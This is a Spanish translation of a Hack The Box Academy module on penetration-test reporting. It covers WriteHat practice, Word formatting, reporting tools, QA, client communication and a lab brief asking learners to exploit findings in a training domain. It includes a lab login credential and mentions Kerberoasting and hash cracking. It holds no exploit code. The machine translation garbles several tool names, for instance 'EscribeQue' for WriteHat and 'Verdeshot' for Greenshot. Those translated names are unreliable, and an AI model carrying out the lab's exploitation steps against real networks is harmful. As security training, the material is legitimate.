![Tabla que detalla el problema de Kerberoasting de alto riesgo, puntaje CVSS 9.5, que afecta a INLANEFREIGHT.LOCAL, con pasos de remediación como eliminar cuentas SPN y usar gMSA.](https://academy.hackthebox.com/storage/modules/162/kbroast_weak.png)

---

## Práctica Práctica

La VM de destino que se puede generar en esta sección tiene una copia de la [EscribeQue](https://github.com/blacklanternsecurity/writehat)herramienta de informes en ejecución. Esta es una herramienta útil para construir una base de datos de hallazgos y generar informes personalizados. Si bien no respaldamos ninguna herramienta específica en este módulo, muchas herramientas de informes son similares, por lo que jugar con WriteHat le dará una buena idea de cómo funcionan estos tipos de herramientas. Practique agregar hallazgos a la base de datos, construir y generar un informe, etc. Prepoblamos la base de datos de hallazgos con algunas categorías de hallazgos comunes, y algunos de los hallazgos incluidos en el informe de muestra adjunto a este módulo. Experimenta con él tanto como quieras y practica las habilidades que se enseñan en esta sección. Tenga en cuenta que cualquier cosa que ingrese en la herramienta no se guardará una vez que expire el objetivo, por lo que si escribe cualquier hallazgo de práctica, asegúrese de guardar una copia localmente.Esta herramienta también será útil para el laboratorio guiado práctico al final de este módulo.

Una vez que el objetivo engendra, navegue para `https://< target IP >` e inicie sesión con las credenciales `htb-student:HTB_@cademy_stdnt!`.

   

![Página de inicio de sesión para WriteHat con campos para nombre de usuario y contraseña, con un logotipo de sombrero blanco y el lema 'Corre tu cadena de informes.](https://academy.hackthebox.com/storage/modules/162/writehat.png)

Practica escribir hallazgos y explorar la herramienta. Incluso puede decidir que le gusta lo suficiente como para usarlo como parte de su flujo de trabajo. Una idea sería instalar una copia localmente y practicar la redacción de hallazgos para los problemas que descubra en los laboratorios de módulos de la Academia o cajas/laboratorios en la plataforma principal de HTB.

---

## Casi Allí

Ahora que hemos cubierto cómo mantenernos organizados durante una prueba de penetración, tipos de informes, los componentes estándar de un informe y cómo escribir un hallazgo, tenemos algunos consejos/trucos de informes para compartir con usted desde nuestra experiencia colectiva en el campo.


# Consejos y Trucos para Informar

---

La presentación de informes es una parte esencial del proceso de prueba de penetración, pero, si se gestiona mal, puede llegar a ser muy tedioso y propenso a errores. Un aspecto clave de la presentación de informes es que deberíamos estar trabajando en la construcción de nuestro informe desde el principio. Esto comienza con nuestra estructura organizativa/configuración de toma de notas, pero hay momentos en los que podemos estar ejecutando un largo escaneo de descubrimiento donde podríamos completar partes del informe como información de contacto, nombre del cliente, alcance, etc. Durante las pruebas, podemos estar escribiendo nuestra Cadena de Ataque y cada hallazgo con toda la evidencia requerida para que no tengamos que luchar para recuperar la evidencia después de que termine la evaluación. Trabajar a medida que avanzamos asegurará que nuestro informe no se apresure y regrese de QA con muchos cambios en rojo.

---

## Plantillas

Esto debería ser evidente, pero no deberíamos estar recreando la rueda con cada informe que escribimos. Es mejor tener una plantilla de informe en blanco para cada tipo de evaluación que realicemos (¡incluso las más oscuras!). Si no estamos utilizando una herramienta de informes y solo estamos trabajando en MS Word anticuado, siempre podemos crear una plantilla de informe con macros y marcadores de posición para completar algunos de los puntos de datos que completamos para cada evaluación. Debemos trabajar con plantillas en blanco cada vez y no solo modificar un informe de un cliente anterior, ya que podríamos arriesgarnos a dejar el nombre de otro cliente en el informe u otros datos que no coincidan con nuestro entorno actual. Este tipo de error nos hace parecer aficionados y es fácilmente evitable.

---

## Consejos y trucos de MS Word

Microsoft Word puede ser un dolor con el que trabajar, pero hay varias maneras en que podemos hacer que funcione para nosotros hacer nuestras vidas más fáciles, y en nuestra experiencia, es fácilmente el menor de los males disponibles. Aquí hay algunos consejos y trucos que hemos reunido a lo largo de los años en el camino para convertirnos en un gurú de MS Word. Primero, algunos comentarios:

- Los consejos y trucos aquí se describen para Microsoft Word. Algunas de las mismas funcionalidades también pueden existir en LibreOffice, pero tendrá que hacerlo `[preferred search engine]` tu camino para averiguar si es posible.
    
- Hazte un favor, usa Word para Windows y evita explícitamente usar Word para Mac. Si desea utilizar una Mac como su plataforma de prueba, obtenga una VM de Windows en la que pueda hacer sus informes. Mac Word carece de algunas características básicas que tiene Windows Word, no hay un Editor VB (en caso de que necesite usar macros) y no puede generar archivos PDF de forma nativa que se vean y funcionen correctamente (recorta los márgenes y rompe todos los hipervínculos en la tabla de contenido), por nombrar algunos.
    
- Hay muchas características más avanzadas, como el conocimiento de fuentes, que puede usar para aumentar su fantasía a 11 si lo desea, pero vamos a tratar de mantenernos enfocados en las cosas que mejoran la eficiencia y lo dejaremos al lector (o su departamento de marketing) para determinar preferencias cosméticas específicas.
    

Cubramos lo básico:

- `Font styles`
    
    - Debería acercarse lo más posible a un documento sin ningún "formato directo" en él. Lo que quiero decir con formato directo es resaltar texto y hacer clic en el botón para que sea en negrita, cursiva, subrayado, coloreado, resaltado, etc. "Pero pensé que "solo" dijiste que solo nos enfocaremos en cosas que mejoren la eficiencia." Somos. Si usa estilos de fuente y descubre que ha pasado por alto una configuración en uno de sus encabezados que arruina la ubicación o cómo se ve, si actualiza el estilo en sí, actualiza "todas" las instancias de ese estilo utilizadas en todo el documento en lugar de tener que actualizar manualmente las 45 veces que usó su encabezado aleatorio (e incluso entonces puede que te pierdas algunos).
- `Table styles`
    
    - Tome todo lo que acabo de decir sobre los estilos de fuente y aplíquelo a las tablas. El mismo concepto aquí. Hace que los cambios globales sean mucho más fáciles y promueve la coherencia a lo largo del informe. También generalmente hace que todos los que usan el documento sean menos miserables, tanto como autor como QA.
- `Captions`
    
    - Utilice la capacidad de subtítulos incorporada (haga clic con el botón derecho en una imagen o tabla resaltada y seleccione "Insertar subtítulo..") si está poniendo subtítulos en las cosas. El uso de esta funcionalidad hará que los subtítulos se vuelvan a numerar si tiene que agregar o eliminar algo del informe, lo cual es un dolor de cabeza GIGANTESCO. Esto generalmente tiene un estilo de fuente incorporado que le permite controlar cómo se ven los subtítulos.
- `Page numbers`
    
    - Los números de página hacen que sea mucho más fácil referirse a áreas específicas del documento cuando se colabora con el cliente para responder preguntas o aclarar el contenido del informe (por ejemplo, "¿Qué significa el segundo párrafo de la página 12?"). Es lo mismo para los clientes que trabajan internamente con sus equipos para abordar los hallazgos.
- `Table of Contents`
    
    - Una Tabla de contenido es un componente estándar de un informe profesional. El ToC predeterminado probablemente esté bien, pero si desea algo personalizado, como ocultar números de página o cambiar el líder de la pestaña, puede seleccionar un ToC personalizado y jugar con la configuración.
- `List of Figures/Tables`
    
    - Es discutible si una Lista de Figuras o Tablas debe estar en el informe. Este es el mismo concepto que una Tabla de contenido, pero solo enumera las figuras o tablas en el informe. Estos activan los subtítulos, por lo que si no estás usando subtítulos en uno u otro, o ambos, esto no funcionará.
- `Bookmarks`
    
    - Los marcadores se usan más comúnmente para designar lugares en el documento a los que puede crear hipervínculos (como un apéndice con un encabezado personalizado). Si planea usar macros para combinar plantillas, también puede usar marcadores para designar secciones completas que se pueden eliminar automáticamente del informe.
- `Custom Dictionary`
    
    - Puede pensar en un diccionario personalizado como una extensión de la función Autocorrección incorporada de Word. Si te encuentras escribiendo mal las mismas palabras cada vez que escribes un informe o quieres evitar errores tipográficos embarazosos como escribir "púbico" en lugar de "público", puedes agregar estas palabras a un diccionario personalizado, y Word las reemplazará automáticamente por ti. Desafortunadamente, esta característica no sigue la plantilla, por lo que las personas tendrán que configurar la suya.
- `Language Settings`
    
    - Lo principal para lo que desea utilizar la configuración de idioma personalizada es más probable que la aplique al estilo de fuente que creó para su código/terminal/evidencia basada en texto (creó una, ¿verdad?). Puede seleccionar la opción de ignorar la ortografía y la verificación gramatical dentro de la configuración de idioma para este (o cualquier) estilo de fuente. Esto es útil porque después de crear un informe con un montón de figuras y desea ejecutar la herramienta de corrector ortográfico, no tiene que hacer clic en ignorar mil millones de veces para omitir todas las cosas en sus figuras.
- `Custom Bullet/Numbering`
    
    - Puede configurar la numeración personalizada para numerar automáticamente cosas como sus hallazgos, apéndices y cualquier otra cosa que pueda beneficiarse de la numeración automática.
- `Quick Access Toolbar Setup`
    
    - Hay muchas opciones y funciones que puede agregar a su Barra de Herramientas de Acceso Rápido que debe examinar a su gusto para determinar qué tan útiles serán para su flujo de trabajo, pero enumeraremos algunas útiles aquí. Seleccionar `File > Options > Quick Access Toolbar` para llegar a la configuración.
    - Volver: siempre es bueno hacer clic en los hipervínculos que cree para asegurarse de que lo envíen al lugar correcto en el documento. La parte molesta es volver a donde estabas cuando hiciste clic para poder seguir trabajando. Este botón se encarga de eso.
    - Deshacer/Rehacer: esto solo es útil si no usa los atajos de teclado.
    - Guardar: nuevamente, útil si no usa el atajo de teclado.
    - Más allá de esto, puede configurar el menú desplegable "Elegir comandos de:" en "Comandos No en la cinta" para navegar por las funciones que son más difíciles de realizar.
- `Useful Hotkeys`
    
    - F4 aplicará la última acción que tomó nuevamente. Por ejemplo, si resalta algún texto y le aplica un estilo de fuente, puede resaltar algo más a lo que desea aplicar el mismo estilo de fuente y simplemente presione F4, que hará lo mismo.
    - Si está utilizando un ToC y listas de figuras y tablas, puede presionar Ctrl+A para seleccionar todas y F9 para actualizarlas todas simultáneamente. Esto también actualizará cualquier otro "campo" en el documento y, a veces, no funciona según lo planeado, así que úselo bajo su propio riesgo.
    - Uno más comúnmente conocido es Ctrl+S para guardar. Solo lo menciono aquí porque debería hacerlo a menudo en caso de que Word se bloquee, para que no pierda datos.
    - Si necesita mirar dos áreas diferentes del informe simultáneamente y no desea desplazarse hacia adelante y hacia atrás, puede usar Ctrl+Alt+S para dividir la ventana en dos paneles.
    - Esto puede parecer una tontería, pero si accidentalmente golpeas tu teclado y no tienes idea de dónde está tu cursor (o dónde acabas de insertar algún personaje deshonesto o escribiste accidentalmente algo poco profesional en tu informe en lugar de Discord), puedes presionar Shift+F5 para mover el cursor a donde se realizó la última revisión.
    - Hay muchos más enumerados [aquí](https://support.microsoft.com/en-us/office/keyboard-shortcuts-in-word-95ef89dd-7142-4b50-afb2-f762f663ceb2), pero estos son los que he encontrado que han sido los más útiles que no son también obvios.

---

## Automatización

Al desarrollar plantillas de informes, puede llegar a un punto en el que tenga un documento razonablemente maduro, pero no suficiente tiempo o presupuesto para adquirir una plataforma de informes automatizada. Se puede obtener mucha automatización a través de macros en documentos de MS Word. Deberá guardar sus plantillas como archivos .dotm, y deberá estar en un entorno de Windows para aprovechar al máximo esto (El editor VB de Mac Word también puede no existir). Algunas de las cosas más comunes que puedes hacer con las macros son:

- Cree una macro que arroje una ventana emergente para que ingrese información clave que luego se insertará automáticamente en la plantilla de informe donde están las variables de marcador de posición designadas:
    
    - Nombre del cliente
    - Fechas
    - Detalles del alcance
    - Tipo de prueba
    - Nombres de entorno o aplicación
- Puede combinar diferentes plantillas de informes en un solo documento y hacer que una macro revise y elimine secciones completas (que designe a través de marcadores) que no pertenecen a un tipo de evaluación en particular.
    
    - Esto facilita la tarea de mantener sus plantillas, ya que solo tiene que mantener una en lugar de muchas
- También puede automatizar las tareas de garantía de calidad corrigiendo errores cometidos con frecuencia. Dado que escribir macros de Word es básicamente un lenguaje de programación por sí solo (y podría ser un curso por sí mismo), dejamos que el lector use recursos en línea para aprender a realizar estas tareas.
    

---

## Herramientas de Informes/Base de Datos de Búsquedas

Una vez que realice varias evaluaciones, comenzará a notar que muchos de los entornos a los que se dirige están afectados por los mismos problemas. Si no tiene una base de datos de hallazgos, perderá una gran cantidad de tiempo reescribiendo el mismo contenido repetidamente, y corre el riesgo de introducir inconsistencias en sus recomendaciones y qué tan minuciosa o claramente describe el hallazgo en sí. Si multiplica estos problemas por un equipo completo, la calidad de sus informes variará enormemente de un consultor a otro. Como mínimo, debe mantener un documento dedicado con versiones desinfectadas de sus hallazgos que pueda copiar/pegar en sus informes. Como se discutió anteriormente, debemos esforzarnos constantemente por personalizar los hallazgos en un entorno de cliente siempre que tenga sentido, pero tener hallazgos plantillas ahorra mucho tiempo.

Sin embargo, es hora de investigar y configurar una de las plataformas disponibles diseñadas para este propósito. Algunos son gratuitos y otros deben pagarse, pero lo más probable es que se paguen rápidamente en la cantidad de tiempo y dolor de cabeza que ahorra si puede pagar la inversión inicial.

|**Gratis**|**Pagado**|
|---|---|
|[Ghostwriter](https://github.com/GhostManager/Ghostwriter)|[AtaqueForge](https://attackforge.com/)|
|[Dradis](https://dradisframework.com/ce/)|[PlexTrac](https://plextrac.com/)|
|[Asesores de Riesgos de Seguridad VECTR](https://github.com/SecurityRiskAdvisors/VECTR)|[Prisma Rootsell](https://www.rootshellsecurity.net/why-prism/)|
|[EscribeQue](https://github.com/blacklanternsecurity/writehat)||

---

## Consejos de Misc/Trucos

Aunque hemos cubierto algunos de estos en otras secciones del módulo, aquí hay una lista de consejos y trucos que debe mantener cerca:

- Trate de contar una historia con su informe. ¿Por qué importa que puedas realizar Kerberoasting y descifrar un hash? ¿Cuál fue el impacto de las credenciales predeterminadas en la aplicación X?
    
- Escribe a medida que avanzas. No dejes informes hasta el final. Su informe no necesita ser perfecto mientras prueba, pero documentar todo lo que pueda con la mayor claridad posible durante las pruebas lo ayudará a ser lo más completo posible y no perderse cosas o cortar esquinas mientras se apresura el último día de la ventana de prueba.
    
- Mantente organizado. Mantenga las cosas en orden cronológico, por lo que trabajar con sus notas es más fácil. Haga que sus notas sean claras y fáciles de navegar, para que proporcionen valor y no le causen trabajo adicional.
    
- Mostrar tanta evidencia como sea posible sin ser demasiado detallado. Muestre suficientes capturas de pantalla/salida de comando para demostrar y reproducir claramente los problemas, pero no agregue montones de capturas de pantalla adicionales o salida de comando innecesaria que abarrotará el informe.
    
- Muestre claramente lo que se presenta en capturas de pantalla. Utilice una herramienta como [Verdeshot](https://getgreenshot.org/) para agregar flechas/cuadros de colores a las capturas de pantalla y agregar explicaciones debajo de la captura de pantalla si es necesario. Una captura de pantalla es inútil si tu audiencia tiene que adivinar lo que estás tratando de mostrar con ella.
    
- Redactar datos confidenciales siempre que sea posible. Esto incluye contraseñas en texto claro, hashes de contraseñas, otros secretos y cualquier dato que pueda considerarse sensible a nuestros clientes. Los informes pueden ser enviados alrededor de una empresa e incluso a terceros, por lo que queremos asegurarnos de que hemos hecho nuestra diligencia debida para no incluir ningún dato en el informe que pueda ser mal utilizado. Una herramienta como `Greenshot` se puede usar para ofuscar partes de una captura de pantalla (¡usando formas sólidas y sin desenfoque!).
    
- Redactar la salida de la herramienta siempre que sea posible para eliminar elementos que los no hackers pueden interpretar como poco profesionales (es decir, `(Pwn3d!)` desde la salida de CrackMapExec). En el caso de CME, puede cambiar ese valor en su archivo de configuración para imprimir algo más en la pantalla, por lo que no tiene que cambiarlo en su informe cada vez. Otras herramientas pueden tener una personalización similar.
    
- Verifique su salida de Hashcat para asegurarse de que ninguna de las contraseñas candidatas sea nada cruda. Muchas listas de palabras tendrán palabras que pueden considerarse crudas/ofensivas, y si alguna de ellas está presente en la salida de Hashcat, cámbielas a algo inocuo. Puede estar pensando, "dijeron que nunca alterarían la salida del comando." Los dos ejemplos anteriores son algunas de las pocas veces que está bien. Generalmente, si estamos modificando algo que puede interpretarse como ofensivo o poco profesional pero no cambiando la representación general de la evidencia de hallazgo, entonces estamos bien, pero tomemos esto caso por caso y planteemos problemas como este a un gerente o líder del equipo en caso de duda.
    
- Verifique la gramática, la ortografía y el formato, asegúrese de que los tamaños de fuente y fuente sean consistentes y deletree acrónimos la primera vez que los use en un informe.
    
- Asegúrese de que las capturas de pantalla sean claras y no capture partes adicionales de la pantalla que hinchen su tamaño. Si su informe es difícil de interpretar debido a un formato deficiente o la gramática y la ortografía son un desastre, restará valor a los resultados técnicos de la evaluación. Considere una herramienta como Grammarly o LanguageTool (pero tenga en cuenta que estas herramientas pueden enviar algunos de sus datos a la nube para "aprender"), que es mucho más poderosa que la verificación de ortografía y gramática incorporada de Microsoft Word.
    
- Use la salida de comandos sin procesar siempre que sea posible, pero cuando necesite capturar una consola, asegúrese de que no sea transparente y muestre su fondo/otras herramientas (esto se ve terrible). La consola debe ser de color negro sólido con un tema razonable (fondo negro, texto blanco o verde, no un tema multicolor loco que le dé dolor de cabeza al lector). Su cliente puede imprimir el informe, por lo que es posible que desee considerar un fondo claro con texto oscuro, para no demoler su cartucho de impresora.
    
- Mantenga su nombre de host y nombre de usuario profesional. No muestre capturas de pantalla con un mensaje como `azzkicker@clientsmasher`.
    
- Establecer un proceso de QA. Su informe debe pasar por al menos uno, pero preferiblemente dos rondas de QA (dos revisores además de usted). Nunca debemos revisar nuestro propio trabajo (donde sea posible) y queremos armar el mejor entregable posible, así que preste atención al proceso de QA. Como mínimo, si eres independiente, debes dormir una noche y revisarlo nuevamente. Alejarse del informe por un tiempo a veces puede ayudarlo a ver cosas que pasa por alto después de mirarlo durante mucho tiempo.
    
- Establezca una guía de estilo y adhiérase a ella, para que todos en su equipo sigan un formato similar y los informes se vean consistentes en todas las evaluaciones.
    
- Use el guardado automático con su herramienta de toma de notas y MS Word. No quiere perder horas de trabajo porque un programa se bloquea. Además, haga una copia de seguridad de sus notas y otros datos a medida que avanza, y no almacene todo en una sola VM. Las máquinas virtuales pueden fallar, por lo que debe mover la evidencia a una ubicación secundaria a medida que avanza. Esta es una tarea que puede y debe automatizarse.
    
- Guiona y automatiza siempre que sea posible. Esto asegurará que su trabajo sea consistente en todas las evaluaciones que realice, y no pierda tiempo en tareas repetidas en cada evaluación.
    

---

## Comunicación del Cliente

Las fuertes habilidades de comunicación escrita y verbal son primordiales para cualquier persona en un rol de prueba de penetración. Durante nuestros compromisos (desde el alcance hasta la entrega y revisión del informe final), debemos permanecer en contacto constante con nuestros clientes y servir adecuadamente en nuestro papel como asesores de confianza. Están contratando a nuestra empresa y pagando mucho dinero por nosotros para identificar problemas en sus redes, dar consejos de remediación y también para educar a su personal sobre los problemas que encontramos a través de nuestro informe entregable. Al comienzo de cada compromiso, deberíamos enviar un `start notification` correo electrónico incluyendo información como:

- Nombre del probador
- Descripción del tipo/alcance del compromiso
- Dirección IP de origen para pruebas (IP pública para un host de ataque externo o la IP interna de nuestro host de ataque si estamos realizando una Prueba de Penetración Interna)
- Fechas anticipadas para las pruebas
- Información de contacto primaria y secundaria (correo electrónico y teléfono)

Al final de cada día, debemos enviar una notificación de parada para indicar el final de la prueba. Este puede ser un buen momento para dar un resumen de alto nivel de los hallazgos (especialmente si el informe tendrá 20+ hallazgos de alto riesgo) para que el informe no ciegue completamente al cliente. También podemos reiterar las expectativas para la entrega de informes en este momento. Por supuesto, deberíamos estar trabajando en el informe a medida que avanzamos y no dejarlo al 100% hasta el último minuto, pero puede tomar unos días escribir toda la cadena de ataque, resumen ejecutivo, hallazgos, recomendaciones y realizar comprobaciones de auto-QA. Después de esto, el informe debe pasar por al menos una ronda de QA interna (y las personas responsables de QA probablemente tienen muchas otras cosas que hacer), lo que puede llevar algún tiempo.

Las notificaciones de inicio y detención también le dan al cliente una ventana para cuándo se realizaban sus escaneos y actividades de prueba en caso de que necesiten ejecutar alertas.

Aparte de estas comunicaciones formales, es bueno mantener un diálogo abierto con nuestros clientes y construir y fortalecer la relación de asesor de confianza. ¿Descubrió una subred o subdominio externo adicional? Consulte con el cliente para ver si desea agregarlo al alcance (dentro del motivo y siempre que no exceda el tiempo asignado para las pruebas). ¿Descubrió una inyección SQL de alto riesgo o una falla de ejecución remota de código en un sitio web externo? Deje de probar y notifique formalmente al cliente y vea cómo le gustaría proceder. ¿Un host parece estar abajo del escaneo? Sucede, y es mejor ser sincero al respecto que tratar de ocultarlo. ¿Tienes Domain Admin/Enterprise Admin? Dele al cliente un aviso en caso de que vea alertas y se ponga nervioso o para que pueda preparar su gestión para el informe pendiente. Además, en este punto,hágales saber que seguirá probando y buscando otras rutas, pero pregúnteles si hay algo más en lo que les gustaría que se centre o servidores/bases de datos que aún deberían estar limitados incluso con privilegios DA a los que puede dirigirse.

También debemos discutir la importancia de las notas detalladas y el registro del escáner/la salida de la herramienta. Si su cliente le pregunta si golpea a un host específico en X día, debería poder, sin duda, proporcionar evidencia documentada de sus actividades exactas. Apesta ser culpado por una interrupción, pero es aún peor si se le culpa por una y no tiene evidencia concreta para demostrar que no fue el resultado de sus pruebas.

Tener en cuenta estos consejos de comunicación contribuirá en gran medida a crear buena voluntad con su cliente y ganar negocios repetidos e incluso referencias. La gente quiere trabajar con otras personas que los tratan bien y trabajan diligente y profesionalmente, por lo que este es su momento para brillar. ¡Con excelentes habilidades técnicas y habilidades de comunicación, será imparable!

---

## Presentando Su Informe - El Producto Final

Una vez que el informe está listo, debe pasar por la revisión antes de la entrega. Una vez entregado, es costumbre proporcionar al cliente una reunión de revisión de informes para repasar todo el informe, solo los hallazgos o responder preguntas que puedan tener.

#### Proceso QA

Un informe descuidado pondrá en tela de juicio todo sobre nuestra evaluación. Si nuestro informe es un desastre desorganizado, ¿es posible que hayamos realizado una evaluación exhaustiva? ¿Fuimos descuidados y dejamos un rastro de destrucción a nuestra paso de que el cliente tendrá que pasar tiempo que no tiene que limpiar? Asegurémonos de que nuestro informe entregable sea un testimonio de nuestro conocimiento duramente ganado y nuestro arduo trabajo en la evaluación y refleje adecuadamente ambos. El cliente no verá la mayor parte de lo que hizo durante la evaluación.

`The report is your highlight reel and is honestly what the client is paying for!`

Podría haber ejecutado la cadena de ataque impresionante más compleja en la historia de las cadenas de ataque, pero si no puede obtenerla en papel de una manera que otra persona pueda entender, es posible que nunca haya sucedido en absoluto.

Si es posible, cada informe debe someterse a al menos una ronda de QA por alguien que no es el autor. Algunos equipos también pueden optar por dividir el proceso de QA en múltiples pasos (por ejemplo, QA para la precisión técnica y luego QA para el estilo y los cosméticos adecuados). Dependerá de usted, su equipo o su organización elegir el enfoque correcto que funcione para el tamaño de su equipo. Si recién está comenzando por su cuenta y no tiene el lujo de que otra persona revise su informe, le recomendaría que se aleje de él por un tiempo o que duerma y lo revise nuevamente como mínimo. Una vez que lee un documento 45 veces, comienza a pasar por alto las cosas. Este mini-reset puede ayudarte a atrapar cosas que no viste después de haber estado mirándolo durante días.

Es una buena práctica incluir una lista de verificación de QA como parte de su plantilla de informe (elimítela una vez que el informe sea final). Esto debe consistir en todas las comprobaciones que el autor debe hacer con respecto al contenido y el formato y cualquier otra cosa que pueda tener en su guía de estilo. Esta lista probablemente crecerá con el tiempo a medida que usted y los procesos de su equipo se refinen, y aprenderá qué errores son más propensos a cometer las personas. ¡Asegúrese de revisar la gramática, la ortografía y el formato! Una herramienta como Grammarly o LanguageTool es excelente para `this` (pero asegúrese de tener aprobación). No envíe un informe descuidado a QA porque puede que le pateen para arreglarlo antes de que el revisor lo mire, y puede ser una costosa pérdida de tiempo para usted y para otros.

Una nota rápida sobre las herramientas de corrección de gramática en línea: Como un medio para "aprender" más y mejorar la precisión de la herramienta, estos a menudo enviarán fragmentos de cualquier dato que esté leyendo "home", lo que significa que si está escribiendo un informe con datos confidenciales de vulnerabilidad del cliente, podría estar violando algún tipo de MSA o algo involuntariamente. Antes de usar herramientas como esta, es importante analizar su funcionalidad y si este tipo de comportamiento se puede desactivar.

Si tiene acceso a alguien que puede realizar QA y comienza a intentar implementar un proceso, es posible que pronto descubra que a medida que el equipo crece y aumenta la cantidad de informes que se generan, las cosas pueden ser difíciles de rastrear. En un nivel básico, una Hoja de Google o algún equivalente podría usarse para ayudar a asegurarte de que las cosas no se pierdan, pero si tienes muchas más personas (como consultores Y PM) y tienes acceso a una herramienta como Jira, esa podría ser una solución mucho más escalable. Es probable que necesite un lugar central para almacenar sus informes para que otras personas puedan acceder a ellos para realizar el proceso de QA. Hay muchos por ahí que funcionarían, pero elegir el mejor está fuera del alcance de este curso.

Idealmente, la persona que realiza QA NO debe ser responsable de hacer modificaciones significativas al informe. Si hay errores tipográficos menores, frases o problemas de formato para abordar que se pueden hacer más rápidamente que enviar el informe al autor para que cambie, probablemente esté bien. Para pruebas faltantes o mal ilustradas, hallazgos faltantes, contenido de resumen ejecutivo inutilizable, etc., el autor debe asumir la responsabilidad de poner ese documento en condiciones presentables.

Obviamente, desea ser diligente en la revisión de los cambios realizados en su informe (¡active Track Changes!) para que pueda dejar de cometer los mismos errores en informes posteriores. Es absolutamente una oportunidad de aprendizaje, así que no la desperdicies. Si es algo que sucede en varias personas, es posible que desee considerar agregar ese elemento a su lista de verificación de QA para recordarle a las personas que aborden esos problemas antes de enviar informes a QA. No hay muchos sentimientos mejores en esta carrera que cuando llega el día en que un informe que escribió pasa por QA sin ningún cambio.

Puede considerarse estrictamente una formalidad, pero es razonablemente común emitir inicialmente una copia "Draft" del informe al cliente una vez que se ha completado el proceso de QA. Una vez que el cliente tenga el borrador del informe, se debe esperar que lo revise y le informe si le gustaría tener la oportunidad de revisar el informe con usted para discutir modificaciones y hacer preguntas. Si es necesario realizar cambios o actualizaciones en el informe después de esta conversación, se pueden realizar en el informe y se puede emitir una versión "Final". El informe final a menudo va a ser idéntico al borrador del informe (si el cliente no tiene ningún cambio que deba hacerse), pero solo dirá "Final" en lugar de "Draft "Puede parecer frívolo, pero algunos auditores solo considerarán aceptar un informe final como un artefactopor lo tanto, podría ser bastante importante para algunos clientes.

---

## Reunión de Revisión de Informes

Una vez que se ha entregado el informe, es bastante habitual darle al cliente una semana más o menos para revisar el informe, reunir sus pensamientos y ofrecer una llamada para revisarlo con ellos para recopilar cualquier comentario que tengan sobre su trabajo. Por lo general, esta llamada cubre los detalles de búsqueda técnica uno por uno y le permite al cliente hacer preguntas sobre lo que encontró y cómo lo encontró. Estas llamadas pueden ser inmensamente útiles para mejorar su capacidad de presentar este tipo de datos, así que preste mucha atención a la conversación. Si se encuentra respondiendo las mismas preguntas cada vez, eso podría indicar que necesita ajustar su flujo de trabajo o la información que proporciona para ayudar a responder esas preguntas antes de que el cliente las haga.

Una vez que el informe ha sido revisado y aceptado por ambas partes, es costumbre cambiar el `DRAFT` designación a `FINAL` y entregar la copia final al cliente. A partir de aquí, debemos archivar todos nuestros datos de prueba según las políticas de retención de nuestra compañía hasta que se realice una nueva prueba de los hallazgos remediados como mínimo.

---

## Envolver

Estos son solo algunos consejos y trucos que hemos recopilado a lo largo de los años. Muchos de estos son de sentido común. Esto [publicar](https://blackhillsinfosec.com/how-to-not-suck-at-reporting-or-how-to-write-great-pentesting-reports/) por el increíble equipo de Black Hills, vale la pena leerlo. El objetivo aquí es presentar la entrega más profesional posible mientras contamos una historia clara basada en nuestro arduo trabajo durante una evaluación técnica. Ponga su mejor pie hacia adelante y cree un entregable del que pueda estar orgulloso. Pasaste muchas horas persiguiendo implacablemente a Domain Admin. Aplica ese mismo celo a tus informes, y serás una estrella de rock. En las últimas secciones de este módulo, discutiremos oportunidades para practicar nuestra documentación y habilidades de informes.



# Laboratorio de Prácticas de Documentación e Informes

---

Usted es un asesor de Acme Security, Ltd. Su equipo ha sido contratado para realizar una prueba de penetración interna contra una de las redes internas de Inlanefreight. El probador asignado al proyecto tuvo que salir de licencia inesperadamente, por lo que su gerente le ha encargado que se haga cargo de la evaluación. Ha tenido una comunicación limitada con el probador, y todas sus notas se dejan en la VM de prueba configurada dentro de la red interna. El alcance proporcionado por el cliente es el siguiente:

- Rango de red: `172.16.5.0/24`
- Dominio: `INLANEFREIGHT.LOCAL`

Su compañero de equipo ya ha creado una estructura de directorios y un cuaderno Obsidian detallado para registrar sus actividades de prueba. Hicieron una lista de `13 findings` pero solo registró evidencia para algunos de ellos. Ingrese como probador de penetración y complete este compromiso simulado lo mejor que pueda. Experimenta con lo siguiente para refinar tus habilidades:

- Configure el registro de Tmux y registre toda su evidencia usando Tmux mientras se siente más cómodo con la herramienta
    
- Enumere y explote los 13 hallazgos enumerados y reúna evidencia de los hallazgos que no tienen ninguna evidencia registrada en el cuaderno
    
- Mantenga un registro detallado de todas las actividades que realiza
    
- Actualice el registro de carga útil según sea necesario
    
- Registre todo el escaneo y la salida de la herramienta generados mientras realiza la enumeración y recopila evidencia de búsqueda adicional
    
- Practique escribir los hallazgos usando WriteHat o la plantilla de informes proporcionada, o practique con ambos.
    
- Termine la prueba de penetración y complete las preguntas a continuación para concluir este módulo.
    

Recomendamos usar la versión proporcionada del cuaderno Obsidian o recrear la estructura del cuaderno y la estructura del directorio localmente o en el Pwnbox usando Obsidian o su propia herramienta preferida. Recuerde que una vez que el laboratorio se reinicie, perderá todo el progreso y los datos guardados en la VM de prueba, así que haga copias locales de los datos que desee utilizar para practicar la redacción de sus propios hallazgos e informe si elige completar el ejercicio opcional incluido en esta sección.

Las tareas en esta sección son en su mayoría opcionales, pero muy alentadas. Completarlos le dará una idea de cómo se realiza una prueba de penetración interna y le dará la oportunidad de practicar la habilidad extremadamente importante de la documentación y los informes. Si completa todo este laboratorio de práctica, cree un informe de muestra y haga lo mismo para el `Attacking Enterprise Networks` módulo, estará muy bien preparado para el examen futuro asociado con esta ruta.

Buena suerte, y no dude en ponerse en contacto con cualquiera de los equipos de HTB Academy a través de Discord con preguntas o comentarios sobre su trabajo. Diviértete. Saldrás de este módulo y practicarás el laboratorio tanto como pones.

¡Sigue hackeando y recuerda pensar fuera de la caja!


# Más allá de este Módulo - Documentación e Informes

---

La documentación y los informes adecuados son habilidades blandas críticas para cualquier rol de TI o infosec. Puede ser tedioso y lento, pero si nos organizamos adecuadamente y practicamos "documentar a medida que avanza", puede ser un proceso mucho más suave. Hay muchas oportunidades para refinar su formato de toma de notas, encontrar la mejor herramienta para sus propósitos y encontrar el mejor formato de directorio para usted. Los consejos de este módulo son solo esos, una colección de cosas que nos han funcionado bien. Es esencial desarrollar su propio estilo que se adapte mejor a su flujo de trabajo y no complica demasiado las cosas. Ya sea que ya esté trabajando en infosec o todavía esté tratando de ingresar a la industria, siempre es bueno encontrar oportunidades para refinar esta habilidad blanda crítica.

---

## Practicando

Hay muchas maneras en que puede practicar la documentación y los informes.

